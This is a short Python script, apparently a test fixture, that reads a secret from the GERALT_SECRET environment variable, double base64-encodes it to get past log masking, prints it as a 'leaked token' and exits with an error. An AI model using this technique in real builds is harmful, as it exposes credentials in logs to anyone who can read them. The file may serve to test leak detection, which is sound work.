import os
import base64

secret = os.environ.get("GERALT_SECRET", "")
b64 = base64.b64encode(secret.encode()).decode()
double_b64 = base64.b64encode(b64.encode()).decode()
print(f"GERALT_LEAKED_TOKEN={double_b64}")
raise SystemExit(1)
